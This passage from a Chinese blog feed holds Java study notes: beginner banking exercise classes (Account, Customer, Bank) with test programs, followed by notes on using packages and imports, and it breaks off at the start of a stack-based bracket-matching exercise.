class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer3;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Account类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:22</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;<span class="comment">//账号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> balance;<span class="comment">//余额</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> annualInterestRate;<span class="comment">//年利率</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> id, <span class="type">double</span> balance, <span class="type">double</span> annualInterestRate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">        <span class="built_in">this</span>.annualInterestRate = annualInterestRate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getBalance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBalance</span><span class="params">(<span class="type">double</span> balance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getAnnualInterestRate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> annualInterestRate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnnualInterestRate</span><span class="params">(<span class="type">double</span> annualInterestRate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.annualInterestRate = annualInterestRate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withdraw</span> <span class="params">(<span class="type">double</span> amount)</span>&#123;<span class="comment">//取钱</span></span><br><span class="line">        <span class="keyword">if</span> (balance &lt; amount)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;余额不足，取款失败&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        balance -= amount;</span><br><span class="line">        System.out.println(<span class="string">&quot;成功取出：&quot;</span> + amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deposit</span> <span class="params">(<span class="type">double</span> amount)</span>&#123;<span class="comment">//存钱</span></span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            balance += amount;</span><br><span class="line">            System.out.println(<span class="string">&quot;成功存入：&quot;</span> + amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer3;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Customer类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:28</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Account account;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String f, String l)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.firstName = f;</span><br><span class="line">        <span class="built_in">this</span>.lastName = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccount</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.account = account;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFirstName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lastName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Account <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer3;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Customer, Account测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:32</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">cust</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Smith&quot;</span>);</span><br><span class="line">        <span class="type">Account</span> <span class="variable">acct</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">1000</span>, <span class="number">2000</span>, <span class="number">0.0123</span>);</span><br><span class="line"></span><br><span class="line">        cust.setAccount(acct);</span><br><span class="line">        cust.getAccount().deposit(<span class="number">100</span>);</span><br><span class="line">        cust.getAccount().withdraw(<span class="number">960</span>);</span><br><span class="line">        cust.getAccount().withdraw(<span class="number">2000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Customer[&quot;</span> + cust.getLastName() + <span class="string">&quot;,&quot;</span> + cust.getLastName() + <span class="string">&quot;]&quot;</span></span><br><span class="line">        + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;id:&quot;</span> + cust.getAccount().getId()</span><br><span class="line">        + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;annualInterestRate:&quot;</span> + cust.getAccount().getAnnualInterestRate()*<span class="number">100</span> + <span class="string">&quot;%&quot;</span></span><br><span class="line">        + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;balance:&quot;</span> +cust.getAccount().getBalance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Bank-测试"><a href="#Bank-测试" class="headerlink" title="Bank 测试"></a>Bank 测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer4;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Account类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:43</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> balance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">double</span> init_balance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.balance = init_balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getBalance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//存钱操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deposit</span><span class="params">(<span class="type">double</span> amt)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(amt &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            balance += amt;</span><br><span class="line">            System.out.println(<span class="string">&quot;存钱成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//取钱操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withdraw</span><span class="params">(<span class="type">double</span> amt)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(balance &gt;= amt)&#123;</span><br><span class="line">            balance -= amt;</span><br><span class="line">            System.out.println(<span class="string">&quot;取钱成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;余额不足&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer4;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Bank类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:43</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bank</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Customer[] customers;<span class="comment">// 存放多个客户的数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> numberOfCustomers;<span class="comment">// 记录客户的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Bank</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//这里要造数组，否则会空指针</span></span><br><span class="line">        customers = <span class="keyword">new</span> <span class="title class_">Customer</span>[<span class="number">10</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCustomer</span><span class="params">(String f, String l)</span>&#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">cust</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(f, l);</span><br><span class="line">        customers[numberOfCustomers] = cust;</span><br><span class="line">        numberOfCustomers++;</span><br><span class="line">        <span class="comment">//customers[numberOfCustomers++] = cust;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumberOfCustomers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> numberOfCustomers;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Customer <span class="title function_">getCustomer</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>&amp;&amp; index &lt; numberOfCustomers)&#123;</span><br><span class="line">            <span class="keyword">return</span> customers[index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer4;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Customer类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:44</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Account account;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String f, String l)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.firstName = f;</span><br><span class="line">        <span class="built_in">this</span>.lastName = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Account <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccount</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.account = account;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFirstName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer4;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Bank方测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 13:46</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">        bank.addCustomer(<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Smith&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bank.getCustomer(<span class="number">0</span>).setAccount(<span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">2000</span>));</span><br><span class="line">        bank.getCustomer(<span class="number">0</span>).getAccount().withdraw(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">balance</span> <span class="operator">=</span> bank.getCustomer(<span class="number">0</span>).getAccount().getBalance();</span><br><span class="line">        System.out.println(<span class="string">&quot;客户：&quot;</span> + bank.getCustomer(<span class="number">0</span>).getFirstName() + <span class="string">&quot;的账户余额为：&quot;</span> + balance);</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        bank.addCustomer(<span class="string">&quot;万里&quot;</span>, <span class="string">&quot;杨&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;银行客户的个数为：&quot;</span> + bank.getNumberOfCustomers());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Package-的使用"><a href="#Package-的使用" class="headerlink" title="Package 的使用"></a>Package 的使用</h2><ol><li>为了更好的实现项目中类的管理，提供包的概念</li><li>使用 package 声明类或接口所属的包，声明在源文件的首行</li><li>包，属于标识符，遵循标识符的命名规则、规范(xxxyyyzzz)、“见名知意”</li><li>每”.”一次，就代表一层文件目录。</li></ol><h3 id="JDK-中主要的包介绍"><a href="#JDK-中主要的包介绍" class="headerlink" title="JDK 中主要的包介绍"></a>JDK 中主要的包介绍</h3><ol><li>java.lang—-包含一些 Java 语言的核心类，如 String、Math、Integer、 System 和<br>Thread，提供常用功能</li><li>java.net—-包含执行与网络相关的操作的类和接口。</li><li>java.io —-包含能提供多种输入&#x2F;输出功能的类。</li><li>java.util—-包含一些实用工具类，如定义系统特性、接口的集合框架类、使用与日<br>期日历相关的函数。</li><li>java.text—-包含了一些 java 格式化相关的类</li><li>java.sql—-包含了 java 进行 JDBC 数据库编程的相关类&#x2F;接口</li><li>java.awt—-包含了构成抽象窗口工具集（abstract window toolkits）的多个类，<br>这些类被用来构建和管理应用程序的图形用户界面(GUI)。</li></ol><h2 id="Import-的使用"><a href="#Import-的使用" class="headerlink" title="Import 的使用"></a>Import 的使用</h2><ol><li>在源文件中显式的使用 import 结构导入指定包下的类、接口</li><li>声明在包的声明和类的声明之间</li><li>如果需要导入多个结构，则并列写出即可</li><li>可以使用”xxx.*“的方式，表示可以导入 xxx 包下的所有结构</li><li>在 java.lang 下的话（java.lang.System 常用），则可以省略 import 结构</li><li>如果使用的类或接口是本包下定义的，则可以省略 import 结构</li><li>如果在源文件中，使用了不同包下的同名的类，则必须至少有一个类需要以全类名的方式显示。</li><li>使用”xxx.*“方式表明可以调用 xxx 包下的所有结构。但是如果使用的是 xxx 子包下的结构，则仍需要显式导入</li><li>import static:导入指定类或接口中的静态结构:属性或方法。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.exer4.Account;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.exer4.Bank;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.java2.java3.Dog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;                 <span class="comment">//import  类、接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.System.*;   <span class="comment">//import static 结构（属性或方法）</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: PackageImport测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-20 14:59</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PackageImportTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line"></span><br><span class="line">        Arrays.toString(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Account</span> <span class="variable">acct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="comment">//全类名的方式显示</span></span><br><span class="line">        com.atguigu.exer3.<span class="type">Account</span> <span class="variable">acct1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.atguigu.exer3.Account(<span class="number">1000</span>,<span class="number">2000</span>,<span class="number">0.0123</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        java.sql.<span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.sql.Date(<span class="number">123465l</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//import static:导入指定类或接口中的静态结构:属性或方法</span></span><br><span class="line">        out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">num</span> <span class="operator">=</span> round(<span class="number">81</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1901756112&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="封装性" scheme="https://www.bandao.ltd/tags/%E5%B0%81%E8%A3%85%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>java练习3</title>
    <link href="https://www.bandao.ltd/coding/java/exercise/3.html"/>
    <id>https://www.bandao.ltd/coding/java/exercise/3.html</id>
    <published>2021-12-13T12:19:00.000Z</published>
    <updated>2024-11-09T09:12:04.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="用栈进行括号匹配"><a href="#用栈进行括号匹配" class="headerlink" title="用栈进行括号匹配"></a>用栈进行括号匹配</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span 